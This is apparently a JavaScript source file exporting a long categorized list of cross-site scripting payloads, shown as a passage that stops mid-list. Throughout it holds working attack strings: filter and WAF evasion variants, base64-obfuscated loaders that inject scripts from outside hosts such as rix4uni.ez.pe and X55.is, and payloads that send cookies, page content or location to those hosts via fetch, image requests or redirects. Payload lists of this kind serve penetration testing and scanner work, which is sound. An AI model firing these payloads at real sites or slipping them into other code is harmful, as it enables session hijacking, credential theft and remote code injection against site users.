export const PAYLOADS = {
  XSS: [
    // === BASIC ALERT PAYLOADS ===
    { name: "Basic script alert", payload: "<script>alert(1)</script>", tag: "basic" },
    { name: "Basic script alert 2", payload: "<script>alert(document.domain)</script>", tag: "basic" },
    { name: "Basic script prompt", payload: "<script>prompt(document.domain)</script>", tag: "basic" },
    { name: "Basic script confirm", payload: "<script>confirm(9745)</script>", tag: "basic" },
    { name: "Script alert string", payload: "<script>alert(String.fromCharCode(88,83,83))</script>", tag: "basic" },
    { name: "Script case variation", payload: "<sCrIpT>alert(1)</ScRiPt>", tag: "basic" },
    { name: "Script uppercase", payload: "<SCRIPT>alert('XSS')</SCRIPT>", tag: "basic" },
    { name: "Script hex encoded", payload: "\\74script\\76alert(1)\\74/script\\76", tag: "basic" },
    { name: "Script decimal encoded", payload: "&#60;script&#62;alert(1)&#60;/script&#62;", tag: "basic" },
    { name: "Script URL encoded", payload: "%3Cscript%3Ealert(1)%3C/script%3E", tag: "basic" },
    { name: "Script HTML entity", payload: "&lt;script&gt;alert(1)&lt;/script&gt;", tag: "basic" },
    { name: "Script UTF-8 encoded", payload: "%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E", tag: "basic" },

    // === IMG ONERROR PAYLOADS ===
    { name: "Img onerror basic", payload: "<img src=x onerror=alert(1)>", tag: "html" },
    { name: "Img onerror double quote", payload: "<img src=\"x\" onerror=\"alert(1)\">", tag: "html" },
    { name: "Img onerror single quote", payload: "<img src='x' onerror='alert(1)'>", tag: "html" },
    { name: "Img onerror template", payload: "<img src=x onerror=`alert(1)`>", tag: "html" },
    { name: "Img onerror no quotes", payload: "<img src=x onerror=alert(1)>", tag: "html" },
    { name: "Img onerror with bypass", payload: "\"><img src=x onerror=alert(1)>", tag: "html" },
    { name: "Img onerror URL encoded", payload: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", tag: "html" },
    { name: "Img onerror entity encoded", payload: "&lt;img src=1 onerror=alert(1)&gt;", tag: "html" },
    { name: "Img onerror mixed case", payload: "<iMg sRc=x oNeRrOr=alert(1)>", tag: "html" },
    { name: "Img onerror no space", payload: "<img/src/onerror=alert(1)>", tag: "html" },
    { name: "Img onerror double alert", payload: "<img src=x onerror=(alert)(1)&&alert(2)&&al\\u0065rt(3)>", tag: "html" },
    { name: "Img onerror or alert", payload: "<img src=x onerror=(alert)(1)||alert(2)||al\\u0065rt(3)>", tag: "html" },
    { name: "Img onerror with confirm", payload: "<img src=x onerror=confirm(1)>", tag: "html" },
    { name: "Img onerror with prompt", payload: "<img src=x onerror=prompt(1)>", tag: "html" },
    { name: "Img onerror alert domain", payload: "<img src=x onerror=alert(document.domain)>", tag: "html" },
    { name: "Img onerror cookie", payload: "<img src=x onerror=alert(document.cookie)>", tag: "steal" },
    { name: "Img onerror with eval", payload: "<img src=x onerror=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "Img onerror with import", payload: "<img/src/onerror=import('//rix4uni.ez.pe')>", tag: "remote" },
    { name: "Img onerror hex string", payload: "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">", tag: "html" },

    // === SVG ONLOAD PAYLOADS ===
    { name: "Svg onload basic", payload: "<svg onload=alert(1)>", tag: "html" },
    { name: "Svg onload no space", payload: "<svg/onload=alert(1)>", tag: "html" },
    { name: "Svg onload URL encoded", payload: "%3Csvg/onload%3Dalert(1)%3E", tag: "html" },
    { name: "Svg onload entity encoded", payload: "&lt;svg/onload=alert(1)&gt;", tag: "html" },
    { name: "Svg onload mixed case", payload: "<SvG/oNlOaD=alert(1)>", tag: "html" },
    { name: "Svg onload confirm", payload: "<svg onload=confirm(document.domain)>", tag: "html" },
    { name: "Svg onload prompt", payload: "<svg onload=prompt(document.domain)>", tag: "html" },
    { name: "Svg onload with eval", payload: "<svg onload=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "Svg onload import", payload: "<Svg OnLoad=import('//X55.is')>", tag: "remote" },
    { name: "Svg onload window alert", payload: "<svg/onload=window[\"al\"+\"ert\"]`1`>", tag: "html" },
    { name: "Svg onload confirm base64", payload: "<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\"))>", tag: "waf" },
    { name: "Svg onload domain", payload: "<Svg Only=1 OnLoad=confirm(document.domain)>", tag: "html" },
    { name: "Svg onload with new Function", payload: "<svg onload='new Function[\"Y000!\"].find(al\\u0065rt)'>", tag: "filter" },
    { name: "Svg onload with location", payload: "<svg/onload=location='javas'%2B'cript:'%2B>", tag: "filter" },

    // === IFRAME PAYLOADS ===
    { name: "Iframe javascript", payload: "<iframe src=javascript:alert(1)>", tag: "context" },
    { name: "Iframe javascript URL encoded", payload: "<iframe src=\"javascript:alert(1)\">", tag: "context" },
    { name: "Iframe srcdoc img", payload: "<iframe srcdoc=\"<img src=x onerror=alert(999)>\"></iframe>", tag: "context" },
    { name: "Iframe srcdoc script", payload: "<iframe srcdoc=\"<script src='https://rix4uni.ez.pe'></script>\"></iframe>", tag: "remote" },
    { name: "Iframe with eval", payload: "<iframe src=\"javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\"></iframe>", tag: "remote" },
    { name: "Iframe prompt", payload: "<IFRAME SRC=\"javascript:prompt(document.cookie);\"></iframe>", tag: "steal" },
    { name: "Iframe location redirect", payload: "<iframe src=\"javascript:parent.location='https://rix4uni.ez.pe?frame='+document.domain\"></iframe>", tag: "steal" },

    // === BODY ONLOAD ===
    { name: "Body onload basic", payload: "<body onload=alert(1)>", tag: "html" },
    { name: "Body onload domain", payload: "<body onload=alert(document.domain)>", tag: "html" },
    { name: "Body onload script", payload: "<body onload=\"var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)\">", tag: "remote" },

    // === EVENT HANDLER PAYLOADS ===
    { name: "Input onfocus autofocus", payload: "<input onfocus=alert(1) autofocus>", tag: "attr" },
    { name: "Input onfocus eval", payload: "<input autofocus onfocus=\"eval(atob(this.id))\" id=dmVyIGM9bmV3IEltYWdlKCk7Yy5zcmM9J2h0dHBzOi8vcml4NHVuaS5lei5wZS8/Yz0nK2RvY3VtZW50LmNvb2tpZTs=>", tag: "remote" },
    { name: "Input accesskey onclick", payload: "<input accesskey=X onclick=\"self['wind'+'ow']['one'+'rror']=alert;throw 1;\">", tag: "attr" },
    { name: "Textarea autofocus", payload: "<textarea autofocus onfocus=\"location='https://rix4uni.ez.pe/?txt='+document.body.innerHTML\"></textarea>", tag: "steal" },
    { name: "Select onfocus", payload: "<select onfocus=alert(1) autofocus>", tag: "attr" },
    { name: "Details open ontoggle", payload: "<details open ontoggle=alert(1)>", tag: "html" },
    { name: "Details open ontoggle eval", payload: "<details open ontoggle=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "Details open ontoggle confirm", payload: "<Details Open OnToggle=alert?.(1)>", tag: "html" },
    { name: "Details open ontoggle prompt", payload: "<details x=1 open ontoggle=\"prompt(document.cookie);\">", tag: "steal" },
    { name: "Marquee onstart", payload: "<marquee onstart=alert(1)>", tag: "html" },
    { name: "Marquee onstart fetch", payload: "<marquee onstart=\"fetch('https://rix4uni.ez.pe?marquee='+document.cookie)\">BLIND XSS</marquee>", tag: "steal" },
    { name: "Marquee onfinish", payload: "<marquee loop=1 width=0 onfinish=pr\\u006fmpt(document.cookie)>X</marquee>", tag: "steal" },
    { name: "Address onscrollsnapchange", payload: "<address onscrollsnapchange=window['ev'+'a'+[[','b','c'][0]])[window['a'+'to'+(['b','c','d'][0]])('YWxlcnQob3JpZ2luKQ=='); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1</div></address>", tag: "waf" },
    { name: "Div onpointerover", payload: "<div onpointerover=\"javascript:alert(document.domain)\" style=\"width:100%;height:100vh;\"></div>", tag: "attr" },
    { name: "Div onpointerover eval", payload: "<div onpointerover=\"[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))()\"> </div>", tag: "waf" },
    { name: "Div contenteditable onfocus", payload: "<div contenteditable onfocus=\"fetch('https://rix4uni.ez.pe/?x='+document.location)\"></div>", tag: "steal" },
    { name: "Div onmouseover hover", payload: "<div onmouseover=\"var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)\">Hover me</div>", tag: "remote" },
    { name: "Video onerror", payload: "<video src onerror=\"fetch('https://rix4uni.ez.pe?videofail='+document.cookie)\"></video>", tag: "steal" },
    { name: "Video source onerror", payload: "<video><source onerror=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\"></video>", tag: "remote" },
    { name: "Audio onerror", payload: "<audio src=x onerror=alert(1)>", tag: "html" },
    { name: "Body onhashchange", payload: "<body onhashchange=alert(1)><a href=#>click</a>", tag: "attr" },
    { name: "Body onpageshow", payload: "<body onpageshow=alert(1)>", tag: "attr" },
    { name: "Math href javascript", payload: "<math href=\"javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\"></math>", tag: "remote" },
    { name: "Math xlink href", payload: "<math><x xlink:href=javascript:confirm`1`>click", tag: "context" },
    { name: "Embed javascript", payload: "<embed src=javascript:alert(1)>", tag: "context" },
    { name: "Object data", payload: "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>", tag: "data" },

    // === ANCHOR HREF PAYLOADS ===
    { name: "Anchor href javascript", payload: "<a href=\"javascript:alert(1)\">x</a>", tag: "context" },
    { name: "Anchor href with bypass", payload: "<A HRef=\"JavaScript:k='a',top[k+'lert'](origin)\">", tag: "waf" },
    { name: "Anchor href with Reflect", payload: "<a href=\"javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))\">ClickMe</a>", tag: "waf" },
    { name: "Anchor href encoded", payload: "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/X55.is/.source)\" />click", tag: "waf" },

    // === STYLE PAYLOADS ===
    { name: "Style import", payload: "<style>@import url(https://rix4uni.ez.pe);</style>", tag: "remote" },
    { name: "Style onload", payload: "<Style+OnLoad=\"1>+alert(1)\">", tag: "html" },
    { name: "Style content-visibility", payload: "\"Style=Content-Visibility:Auto OnContentVisibilityAutoStateChange=confirm(1)//", tag: "attr" },

    // === FORM PAYLOADS ===
    { name: "Form action javascript", payload: "<form action=\"javascript:alert(1)\"><input type=\"submit\"></form>", tag: "context" },
    { name: "Form onformdata", payload: "<form onformdata=window.confirm(cookie)><button>XSS here", tag: "attr" },

    // === META PAYLOADS ===
    { name: "Meta refresh", payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", tag: "context" },

    // === LINK PAYLOADS ===
    { name: "Link import", payload: "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">", tag: "data" },

    // === DATA URI PAYLOADS ===
    { name: "Data URI base64", payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", tag: "data" },
    { name: "Data URI text", payload: "data:text/html,<script>alert(1)</script>", tag: "data" },
    { name: "Data URI svg", payload: "<svg><script href=data:,alert(1) />", tag: "data" },

    // === EMBED PAYLOADS ===
    { name: "Embed data", payload: "<embed src=\"data:text/html,<script>alert(1)</script>\">", tag: "data" },
    { name: "Embed SVG", payload: "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", tag: "data" },

    // === SVG ADVANCED PAYLOADS ===
    { name: "SVG with animate", payload: "<svg><animate onbegin=alert(1)>", tag: "html" },
    { name: "SVG with set", payload: "<svg><set onbegin=alert(1)>", tag: "html" },
    { name: "SVG with animatetransform", payload: "<svg><animatetransform onbegin=alert(1)>", tag: "html" },
    { name: "SVG with foreignObject", payload: "<svg><foreignObject><iframe srcdoc=\"<script src='https://rix4uni.ez.pe'></script>\"></iframe></foreignObject></svg>", tag: "remote" },
    { name: "SVG with use href", payload: "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x\" /></svg>", tag: "data" },
    { name: "SVG with desc CDATA", payload: "<svg><desc><![CDATA[</desc><script src=\"https://rix4uni.ez.pe\"></script>]]></svg>", tag: "remote" },
    { name: "SVG with a xlink", payload: "<svg><a xlink:href=\"https://rix4uni.ez.pe\"><rect onfocus=\"this.href.baseVal='https://rix4uni.ez.pe?svgfocus='+document.domain\" tabindex=\"1\"/></a></svg>", tag: "steal" },
    { name: "SVG onload innerHTML", payload: "<Svg+OnLoad=innerHTML=URL,outerHTML=textContent>&#60Img/Src/OnError=alert(1)&#62k", tag: "waf" },

    // === WAF BYPASS / FILTER EVASION ===
    { name: "WAF split alert", payload: "JavaScrip<t>t:aler<t>t(<t>1)//", tag: "waf" },
    { name: "WAF template literal", payload: "`'\";//><img/src=x onError=\"${x};alert(`1`);\">", tag: "waf" },
    { name: "WAF onload location", payload: "`'\";//><Img Src=a OnError=location=src>", tag: "waf" },
    { name: "WAF confirm base64", payload: "`'\";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob(\"WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d\"))>", tag: "waf" },
    { name: "WAF top alert", payload: "<A Href=\"JavaScript:k='a',top[k+'lert'](origin)\">", tag: "waf" },
    { name: "WAF location textContent", payload: "<Svg OnLoad=location=textContent>", tag: "waf" },
    { name: "WAF comment break", payload: "--><script>alert(1)</script>", tag: "context" },
    { name: "WAF JS comment break", payload: "--><script>alert(1)</script>", tag: "context" },
    { name: "WAF HTML comment", payload: "<!--><svg+onload='top[/al/.source+/ert/.source](document.cookie)'>", tag: "waf" },
    { name: "WAF with import", payload: "<Script Src=//X55.is>", tag: "remote" },
    { name: "WAF with script src", payload: "<script src=//xss.rocks/xss.js></script>", tag: "remote" },
    { name: "WAF with eval atob", payload: "\"><script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnICsgZG9jdW1lbnQuZG9tYWluKTthbGVydCgnWW91ciBDb29raWVzOlxuJyArIGRvY3VtZW50LmNvb2tpZSk7'))</script>", tag: "steal" },
    { name: "WAF with Function", payload: "Function(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\")()", tag: "waf" },
    { name: "WAF with template literal", payload: "${alert(1)}", tag: "waf" },
    { name: "WAF with double braces", payload: "{{alert(1)}}", tag: "waf" },
    { name: "WAF with bracket syntax", payload: "[[${alert(1)}]]", tag: "waf" },
    { name: "WAF with constructor", payload: "${'a'.constructor.constructor`alert(1)`()}", tag: "waf" },
    { name: "WAF with replace", payload: "'a'.replace(/./,alert)", tag: "waf" },
    { name: "WAF with replace call", payload: "'a'.replace.call`1${/./}${alert}`", tag: "waf" },
    { name: "WAF with replace template", payload: "'a,'.replace`a${alert}`", tag: "waf" },
    { name: "WAF with map", payload: "');[1].map(alert);//", tag: "waf" },
    { name: "WAF with fetch", payload: "'); fetch('https://X55.is?1=14357/.source/?data='+document.cookie); //", tag: "steal" },
    { name: "WAF with eval call", payload: "a=eval,c=[\"a\"],x=[\"lert\"],t=${c}${x}(origin)`,http://a.call`1${t}`", tag: "waf" },
    { name: "WAF with throw", payload: "javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain", tag: "waf" },
    { name: "WAF with setTimeout", payload: "\">-setTimeout`\\u0028alert(1)\\u0029`-\"", tag: "waf" },
    { name: "WAF with confirm dot", payload: "javascript://%250Aconfirm?.(1)//", tag: "waf" },
    { name: "WAF with top confirm", payload: "javascript://%250Dtop.confirm?.(1)//", tag: "waf" },
    { name: "WAF with location hash", payload: "<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)", tag: "waf" },
    { name: "WAF with base href", payload: "<Base Href=//X55.is>", tag: "waf" },
    { name: "WAF with innerHTML", payload: "<Svg+OnLoad=innerHTML=URL,outerHTML=textContent>&#60Img/Src/OnError=alert(1)&#62k", tag: "waf" },
    { name: "WAF with oncontentvisibility", payload: "' oncontent\\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\\v+styl\\u0065='content-visibility:auto", tag: "waf" },

    // === BLIND XSS / STEAL ===
    { name: "Blind cookie steal img", payload: "<img src=x onerror=\"new Image().src='https://rix4uni.ez.pe/?e='+document.domain\">", tag: "steal" },
    { name: "Blind cookie steal details", payload: "<details open ontoggle=\"new Image().src='https://rix4uni.ez.pe?toggle='+document.cookie\"></details>", tag: "steal" },
    { name: "Blind cookie steal script", payload: "<Script>window.valueOf=alert;window%2B1</Script>", tag: "steal" },
    { name: "Blind cookie steal with fetch", payload: "<script>fetch(\"//rix4uni.ez.pe\").then(r=>r.text()).then(t=>eval(t))</script>", tag: "remote" },

    // === HTML INJECTION ===
    { name: "HTML h1 break", payload: "</h1><img src=x onerror=alert(1)>", tag: "breakout" },
    { name: "HTML comment break", payload: "--><script>alert(1)</script>", tag: "breakout" },
    { name: "HTML attr breakout", payload: "\"><svg onload=alert(1)>", tag: "breakout" },
    { name: "HTML plain markup", payload: "<h1>test</h1>", tag: "markup" },
    { name: "HTML select option", payload: "<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>", tag: "breakout" },

    // === REMOTE SCRIPT LOADING ===
    { name: "Remote script src", payload: "<script src=//xss.rocks/xss.js></script>", tag: "remote" },
    { name: "Remote script import", payload: "<Img Src=//X55.is?1=14357/.source OnLoad=import(src)>", tag: "remote" },
    { name: "Remote script import 2", payload: "<img/src/onerror=import('//rix4uni.ez.pe')>", tag: "remote" },
    { name: "Remote script import 3", payload: "<Svg OnLoad=import('//X55.is')>", tag: "remote" },
    { name: "Remote script import 4", payload: "<Script/Src=//X55.is>", tag: "remote" },
    { name: "Remote script with eval", payload: "<svg onload=\"eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))\">", tag: "remote" },
    { name: "Remote script with import", payload: "<details open ontoggle=\"import(//rix4uni.ez.pe)\">", tag: "remote" },

    // === URL ENCODED PAYLOADS ===
    { name: "URL encoded script", payload: "%3Cscript%3Ealert(1)%3C/script%3E", tag: "encoded" },
    { name: "URL encoded img", payload: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", tag: "encoded" },
    { name: "URL encoded svg", payload: "%3Csvg/onload%3Dalert(1)%3E", tag: "encoded" },
    { name: "URL encoded with confirm", payload: "%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e", tag: "encoded" },
    { name: "URL encoded double", payload: "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E", tag: "encoded" },
    { name: "URL encoded script with cookie", payload: "%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E", tag: "steal" },
    { name: "URL encoded svg with alert", payload: "%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E", tag: "encoded" },

    // === HEX ENCODED PAYLOADS ===
    { name: "Hex encoded script", payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", tag: "encoded" },
    { name: "Hex encoded svg", payload: "\\x3csvg/onload=alert(1)\\x3e", tag: "encoded" },
    { name: "Hex encoded with eval", payload: "\\x3cimg src=x onerror=alert\\x281\\x29\\x3e", tag: "encoded" },

    // === DECIMAL ENTITY ENCODED ===
    { name: "Decimal entity script", payload: "&#60;script&#62;alert(1)&#60;/script&#62;", tag: "encoded" },
    { name: "Decimal entity svg", payload: "&#60;svg/onload=alert(1)&#62;", tag: "encoded" },
    { name: "Decimal entity img", payload: "&#60;img src=1 onerror=alert(1)&#62;", tag: "encoded" },

    // === HTML ENTITY ENCODED ===
    { name: "HTML entity script", payload: "&lt;script&gt;alert(1)&lt;/script&gt;", tag: "encoded" },
    { name: "HTML entity img", payload: "&lt;img src=1 onerror=alert(1)&gt;", tag: "encoded" },
    { name: "HTML entity svg", payload: "&lt;svg/onload=alert(1)&gt;", tag: "encoded" },

    // === UTF-8 / UNICODE ENCODED ===
    { name: "UTF-8 script", payload: "%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E", tag: "encoded" },
    { name: "UTF-8 img", payload: "%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E", tag: "encoded" },

    // === ADVANCED WAF BYPASS ===
    { name: "WAF with unicode escape", payload: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", tag: "waf" },
    { name: "WAF with double encoding", payload: "%253Cscript%253Ealert(1)%253C/script%253E", tag: "waf" },
    { name: "WAF with null byte", payload: "<scr%00ipt>alert(1)</scr%00ipt>", tag: "waf" },
    { name: "WAF with line break", payload: "<scr%0Aipt>alert(1)</scr%0Aipt>", tag: "waf" },
    { name: "WAF with tab", payload: "<scr%09ipt>alert(1)</scr%09ipt>", tag: "waf" },
    { name: "WAF with comment", payload: "<scr<!-->ipt>alert(1)</scr<!-->ipt>", tag: "waf" },

    // === MISC PAYLOADS ===
    { name: "Misc onerror with alert", payload: "\"><img src=x onerrora=confirm() onerror=confirm(1)>", tag: "html" },
    { name: "Misc svg comment", payload: "<svg onload=alert(1)<!--", tag: "html" },
    { name: "Misc svg with confirm", payload: "\"><!--><Svg OnLoad=_=confirm,(1)<!--", tag: "html" },
    { name: "Misc script with eval", payload: "\"><Script><Svg/OnLoad=alert(1)>{7*7}", tag: "waf" },
    { name: "Misc with contentEditable", payload: "JavaScript://%250A/*?'/*'/*\"/*\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\\76-->", tag: "waf" },
    { name: "Misc with onToggle", payload: "onToggLe='let%20x=%60javascri%60%3Blet%20y=%60pt:aler%60%3Blet%20z=%60t()%60%3Blet%20a=x+y+z%3Blocation=a'", tag: "waf" },
    { name: "Misc with confirm", payload: "1\"/confirm?.(1)/\"", tag: "waf" },
    { name: "Misc with alert split", payload: "1'-confirm`K`-'", tag: "waf" },
    { name: "Misc with oct encoded", payload: "1\\47\\42\\55\\55\\41\\76\\74Img\\40Src\\40OnError\\75confirm\\140\\113\\140\\76=1", tag: "waf" },
    { name: "Misc with CSS selector", payload: "body[xss*=1]{background:url('https://X55.is?1=14357/.source');}", tag: "css" },
    { name: "Misc with onXSS", payload: "OnXSS=<Img/Src/OnError=alert(1)>", tag: "attr" },
    { name: "Misc with oncontentvisibility", payload: "' oncontent\\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\\v+styl\\u0065='content-visibility:auto", tag: "attr" },
    { name: "Misc with svg onload", payload: "x\"><svg%250donload%3D\"window%5B'alert'%5D(location%5B'hostname'%5D)\"", tag: "waf" },
    { name: "Misc with confirm parens", payload: "\"-(confirm)(1)-\\\"", tag: "waf" },
    { name: "Misc with single quote confirm", payload: "'-(confirm)(1)-'", tag: "waf" },
    { name: "Misc with escaped confirm", payload: "\\'-\\(confirm\\)\\(1\\)//", tag: "waf" },
    { name: "Misc with escaped confirm 2", payload: "\\\"-\\(confirm\\)\\(1\\)//", tag: "waf" },
    { name: "Misc with onerror confirm", payload: "')\"onerror=(confirm)(1)///", tag: "waf" },
    { name: "Misc with marquee and confirm", payload: "'>><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>", tag: "html" },
    { name: "Misc with animateTransform", payload: "</script><svg><animatetransform onbegin=alert(1)>", tag: "html" },
    { name: "Misc with textarea break", payload: "</textarea><script>alert(1)</script>", tag: "breakout" },
    { name: "Misc with div expression", payload: "<div style=\"xss:expression(alert(1))\">", tag: "css" },
    { name: "Misc with style import", payload: "<style>@import'javascript:alert(1)';</style>", tag: "css" },
    { name: "Misc with meta refresh", payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", tag: "context" },
    { name: "Misc with link import", payload: "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">", tag: "data" },
    { name: "Misc with import dynamic", payload: "<script>import('data:text/javascript,alert(1)')</script>", tag: "remote" },
    { name: "Misc with keygen", payload: "<keygen onfocus=alert(1) autofocus>", tag: "attr" },
    { name: "Misc with svg script", payload: "<svg><script>alert(1)</script></svg>", tag: "html" },
    { name: "Misc with onerror eval", payload: "\"><script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnICsgZG9jdW1lbnQuZG9tYWluKTthbGVydCgnWW91ciBDb29raWVzOlxuJyArIGRvY3VtZW50LmNvb2tpZSk7'))</script>", tag: "steal" },
    { name: "Misc with onbegin", payload: "<svg><animate onbegin=alert(1)>", tag: "html" },
    { name: "Misc with set onbegin", payload: "<svg><set onbegin=alert(1)>", tag: "html" },
    { name: "Misc with animatetransform onbegin", payload: "<svg><animatetransform onbegin=alert(1)>", tag: "html" },
    { name: "Misc with math mtext", payload: "<math><mtext></mtext><mi xlink:href=\"javascript:alert(1)\">click</mi></math>", tag: "context" },
    { name: "Misc with hashchange", payload: "<body onhashchange=alert(1)><a href=#>click</a>", tag: "attr" },
    { name: "Misc with pageshow", payload: "<body onpageshow=alert(1)>", tag: "attr" },
    { name: "Misc with onstart", payload: "<marquee onstart=alert(1)>", tag: "html" },
    { name: "Misc with onfinish", payload: "<marquee onfinish=alert(1)>", tag: "html" },
    { name: "Misc with audio onerror", payload: "<audio src=x onerror=alert(1)>", tag: "html" },
    { name: "Misc with video source", payload: "<video><source onerror=alert(1)>", tag: "html" },

    // === CONTEXTUAL PAYLOADS ===
    { name: "Context attr double quote", payload: "\"onload=alert(1) x=\"", tag: "attr" },
    { name: "Context attr autofocus", payload: "\"autofocus onfocus=alert(1) x=\"", tag: "attr" },
    { name: "Context attr onmouseover", payload: "\"onmouseover=alert(1) x=\"", tag: "attr" },
    { name: "Context single quote", payload: "'><img src=x onerror=alert(1)>", tag: "context" },
    { name: "Context double quote", payload: "\"><img src=x onerror=alert(1)>", tag: "context" },
    { name: "Context comment break", payload: "--><script>alert(1)</script>", tag: "context" },
    { name: "Context script comment", payload: "</script><script>alert(1)</script>", tag: "context" },
    { name: "Context textarea break", payload: "</textarea><script>alert(1)</script>", tag: "context" },
    { name: "Context title break", payload: "</title><script>alert(1)</script>", tag: "context" },
    { name: "Context style break", payload: "</style><script>alert(1)</script>", tag: "context" },
    { name: "Context iframe break", payload: "</iframe><script>alert(1)</script>", tag: "context" },
    { name: "Context noscript break", payload: "</noscript><script>alert(1)</script>", tag: "context" },

    // === ADDITIONAL WAF BYPASS ===
    { name: "WAF with event handler", payload: "\"OnMouseEnter=(confirm)(1)//", tag: "waf" },
    { name: "WAF with oncontentvisibility", payload: "\"Style=Content-Visibility:Auto OnContentVisibilityAutoStateChange=confirm(1)//", tag: "waf" },
